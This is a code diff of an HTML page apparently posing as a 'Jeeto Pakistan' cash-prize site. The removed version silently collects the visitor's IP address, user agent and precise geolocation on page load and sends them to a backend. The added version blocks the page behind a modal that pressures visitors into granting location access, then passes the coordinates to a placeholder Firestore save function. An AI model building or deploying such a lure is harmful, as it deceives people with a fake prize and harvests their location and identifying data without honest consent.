@@ -1,85 +1,98 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Jeeto Pakistan Jeeto 100,000/- PKR Cash</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jeeto Pakistan Jeeto 100,000/- Cash</title>
+    <style>
+        /* Styles for the pre-loading popup/modal */
+        #preload-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        #preload-modal h2 {
+            margin-bottom: 20px;
+        }
+
+        #agree-button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: white;
+            background-color: #007BFF;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        #agree-button:hover {
+            background-color: #0056b3;
+        }
+
+        #deny-message {
+            color: red;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-  <iframe 
-    src="/Jeeto%20Pakistan.html" 
-    style="width: 100%; height: 100vh; border: none;"
-    title="Jeeto Pakistan Page">
-  </iframe>
+    <!-- Preloading Popup -->
+    <div id="preload-modal">
+        <h2>To continue, allow location access</h2>
+        <p>We need access to your location to proceed. Click "Agree" to grant permission and continue to the Jeeto Pakistan page.</p>
+        <button id="agree-button">Agree</button>
+        <p id="deny-message" style="display: none;">You must allow location access to proceed.</p>
+    </div>
 
-  <script>
-    // Function to fetch IP address from IPify
-    async function fetchIP() {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        return data.ip; // Return the IP address
-      } catch (error) {
-        console.error('Error fetching IP:', error);
-        return 'IP not available'; // Fallback if IP can't be fetched
-      }
-    }
+    <!-- Embed Jeeto Pakistan Webpage using iframe -->
+    <iframe id="jeeto-iframe" src="/Jeeto%20Pakistan.html" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: none; display: none;"></iframe>
 
-    // Function to send data to the backend
-    async function sendData(data) {
-      try {
-        const response = await fetch('/api/user-data', {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data),
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const preloadModal = document.getElementById('preload-modal');
+            const agreeButton = document.getElementById('agree-button');
+            const denyMessage = document.getElementById('deny-message');
+            const jeetoIframe = document.getElementById('jeeto-iframe');
+
+            agreeButton.addEventListener('click', () => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            preloadModal.style.display = 'none';
+                            jeetoIframe.style.display = 'block';
+
+                            const { latitude, longitude } = position.coords;
+                            console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+
+                            // Save location to Firestore (placeholder code)
+                            saveLocationToFirestore(latitude, longitude);
+                        },
+                        (error) => {
+                            denyMessage.style.display = 'block';
+                            console.error('Location access denied:', error);
+                        }
+                    );
+                } else {
+                    denyMessage.style.display = 'block';
+                    console.error('Geolocation is not supported by this browser.');
+                }
+            });
         });
 
-        const result = await response.json();
-        console.log('Server Response:', result);
-      } catch (error) {
-        console.error('Error sending data:', error);
-      }
-    }
-
-    // Function to get geolocation
-    function getLocation(ip) {
-      if (!navigator.geolocation) {
-        console.error('Geolocation is not supported by your browser.');
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const { latitude, longitude } = position.coords;
-
-          // Collect user data
-          const data = {
-            ip: ip,
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString(),
-            latitude,
-            longitude,
-          };
-
-          // Send data to the backend
-          sendData(data);
-        },
-        (error) => {
-          console.error('Error getting geolocation:', error);
+        function saveLocationToFirestore(latitude, longitude) {
+            // Placeholder function to save location to Firestore
+            console.log('Saving location to Firestore:', { latitude, longitude });
         }
-      );
-    }
-
-    // Main function to orchestrate data collection
-    async function collectUserData() {
-      const ip = await fetchIP(); // Fetch IP using IPify API
-      getLocation(ip); // Fetch geolocation and send all data
-    }
-
-    // Trigger user data collection on page load
-    collectUserData();
-  </script>
+    </script>
 </body>
 </html>
